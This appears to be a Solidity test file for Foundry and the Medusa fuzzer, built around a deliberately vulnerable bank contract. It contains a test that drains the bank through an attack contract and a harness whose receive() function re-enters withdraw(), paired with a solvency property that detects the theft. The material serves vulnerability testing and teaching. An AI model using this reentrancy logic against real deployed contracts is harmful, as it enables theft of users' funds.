// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/Reentrancy.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attack attackContract;

    function setUp() public {
        bank = new VulnerableBank();
        attackContract = new Attack(address(bank));

        // Setup initial funds for the bank to be stolen
        vm.deal(address(bank), 10 ether);
        // We cheat to give bank money, but in reality it should come from deposits.
        // For Medusa to steal, we need "legitimate" funds in there.
    }

    // --- FOUNDRY TEST ---
    function testReentrancyAttack() public {
        // En Foundry simulating usuarios es fácil con pranks
        vm.prank(address(0x1));
        vm.deal(address(0x1), 5 ether);
        bank.deposit{value: 5 ether}();

        vm.deal(address(attackContract), 1 ether);
        attackContract.attack{value: 1 ether}();

        // Si el ataque funciona, el atacante tiene > 1 ether.
        assertGt(address(attackContract).balance, 1 ether);
    }

    // --- MEDUSA PROPERTY ---
    // Medusa fuzzing calls functions on this contract.
    // We want to detect if Medusa can trigger the reentrancy.

    // We need to setup the bank so it has funds to steal.
    // We can do this in constructor or setUp (Medusa runs setUp if present).

    // We expose a proxy function that Medusa can call to deposit/withdraw.
    // Medusa will also try to call `attackContract.attack()` if we expose it or if we add Attack contract to target.
    // But here we are the target.

    bool public vulnerable;

    function proxy_attack() public payable {
        // Medusa calls this. We deploy a fresh attacker or use existing one?
        // Using existing one involves state.
        // Let's simluate the attack step-by-step or just let Medusa find it?
        // Medusa needs to call `bank.withdraw` re-entrantly.
        // Simpler: We just check if the bank balance is consistent with internal accounting.
        // But we don't have internal accounting exposed.
        // Let's use the property: "The Bank should never be insolvent".
        // Insolvent means: Users deposited X, but Bank has < X.
        // We can track total deposits in a ghost variable.
    }

    uint256 public totalDeposits;

    function deposit_for_others() public payable {
        // Simulate other users depositing
        bank.deposit{value: msg.value}();
        totalDeposits += msg.value;
    }

    // Medusa calls this property.
    // If returns FALSE, vulnerability found.
    function property_solvency() public view returns (bool) {
        // Invariant: Bank balance must be >= Total Deposits known (from this proxy)
        // Note: This assumes no one else uses the bank.
        return address(bank).balance >= totalDeposits;
    }

    // We need a way for Medusa to trigger the exploit.
    // We add a function that performs the attack logic, or allows Medusa to do it.
    // If we just expose `bank`, Medusa acts as an EOA. EOAs cannot re-enter easily (no code).
    // So we need a "Malicious Actor" contract that Medusa can instruct.

    // Or we put the malicious logic IN THIS CONTRACT.

    bool public is_reentering;

    function withdraw_proxy() public {
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether && gasleft() > 10000) {
            // Re-enter!
            // We need to trigger this ONLY when we want test to run,
            // but Medusa fuzzes paths.

            // If we just re-enter always, we might break normal withdraws?
            // But valid withdraw changes balance to 0 BEFORE sending (secure) or AFTER (insecure).
            // VulnerableBank changes AFTER.

            // So if we call withdraw(), we receive ETH. Balance is still set.
            // We call withdraw() again.

            try bank.withdraw() {} catch {}
        }
    }

    // So the attack flow for Medusa:
    // 1. Call deposit_for_others (fund the bank)
    // 2. Call deposit (fund this contract) -> wait, we need to track this separately?
    //    If we call bank.deposit, `totalDeposits` increases? No, `deposit_for_others` increases it.
    //    We should have `deposit_self` which allows us to withdraw later.

    function deposit_self() public payable {
        bank.deposit{value: msg.value}();
        // We DO NOT increase totalDeposits here, because we want to verify
        // that we don't steal OTHER people's money.
        // wait, `totalDeposits` tracks "Honest Users".
    }

    // If Medusa calls `deposit_self(1 ether)` then `withdraw_proxy()`.
    // It triggers `receive()`, which re-enters `withdraw()`.
    // We get 1 ether x 2 (or more).
    // Bank balance drops by 2.
    // `totalDeposits` (honest money) should be untouched.
    // But `address(bank).balance` will drop below `totalDeposits`.
    // Assertion `address(bank).balance >= totalDeposits` fails.

    // This is a valid property test!
}
